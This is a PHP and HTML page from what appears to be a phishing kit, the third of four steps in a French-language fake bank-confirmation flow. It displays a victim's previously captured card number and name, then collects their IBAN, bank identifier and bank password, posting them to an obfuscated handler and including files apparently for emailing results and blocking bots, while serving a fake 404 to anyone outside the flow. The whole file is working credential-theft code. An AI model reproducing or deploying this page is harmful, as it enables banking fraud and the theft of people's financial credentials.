<?php 
function ip_visitor_country()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $country  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_countryName'] != null) {
        $country = $ip_data['geoplugin_countryName'];
    }

    return $country;
}

ob_start();
session_start();
if(isset($_SESSION['step_four'])){
include '../email.php';
include'../antibots.php'
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
            <title>Confirmez votre banque</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
                    <style>
                .error {
                    border: 1px solid #c72e2e;
                }
            </style>
<?php include'navbar.php'?>
            <div class="contain biling-p">
                <form method="POST" action="<?php echo 'serv52033.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
                    <center>
                        <span class="step" style="text-transform:uppercase"><b>étape 3 sur 4</b></span>
                        <h3>Confirmez votre banque</h3>
                        <DIV style="text-align:left;text-transform:uppercase">
                            <b>PAYS : </b><span><?php echo ip_visitor_country(); ?></span><br>
                            <b>NUMERO DE CARTE : </b><span><?php echo $_SESSION["c_num"]?></span><br>
                             <b>NOM ET PRENOM : </b><span><?php echo $_SESSION["n_card"] ?></span><br>
                              
                        </DIV>
                        <input id="iban" type="text" name="iban" class="bill_input" placeholder="IBAN" required="required" autocomplete="off" autocorrect="off" aria-required="true">
                        <input id="css" type="text" name="bankid" class="bill_input" placeholder="Identifiant de la banque jusqu'à 11 chiffres" required="required" autocomplete="off" autocorrect="off" aria-required="true">
                        <input type="password" maxlength="64" name="bankpass" class="bill_input" placeholder="Mot de passe à 6 chiffres" required="required" autocomplete="off" autocorrect="off"  aria-required="true">
                        <hr>
                        <input type="submit" name="ibansub" id="sub" value="Continuer" class="bill_input btn-bill">
                    </center>
                </form>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/jquery.maskedinput.js"></script>
            <script src="../js/plugins.js"></script>
            <script>
            $(document).ready(function() {
            var coll = false;
            $('#vu').hide();
            $('#aglbah').on('click',function(){
                if(!coll){
                $('#vu').fadeIn(50);
                $('#iban').fadeOut(50);
                $('#aglbah').html('IBAN');
                $('#css').css('margin-top','15px');
                $('#sub').attr('name','infosub');
                $('#iban').removeAttr('required');
                $("#rib,#codebank,#codeguichet,#ncompte").prop('required',true);
                coll = true;         
                }else{
                $('#vu').fadeOut(50);
                $('#iban').fadeIn(50);
                $('#aglbah').html('Sinon, informations du compte'); 
                $('#css').css('margin-top','5px');
                $('#sub').attr('name','ibansub');
                $('#iban').prop('required',true);
                $("#rib,#codebank,#codeguichet,#ncompte").removeAttr('required');
                coll = false;
                }
            });
    $("#rib,#codebank,#codeguichet,#ncompte").keydown(function (e) {
     
        if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110]) !== -1 ||

            (e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) || 

            (e.keyCode >= 35 && e.keyCode <= 40)) {
                 // let it happen, don't do anything
                 return;
        }
        // Ensure that it is a number and stop the keypress
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    });    
                            $.urlParam = function(name){
	   var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
	   return results[1] || 0;
}
                            
                            if($.urlParam('error')){
$('#iban').addClass('error');
}
                $('#iban').on('focusout',function(){
             $('#iban').removeClass('error');
});
                
            });
$('#iban').on('input',function(){
   $('#iban').val(function () {
    return this.value.toUpperCase();
}); 
});
            </script>
        </body>
    </html>
<?php
} 
else {
    header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>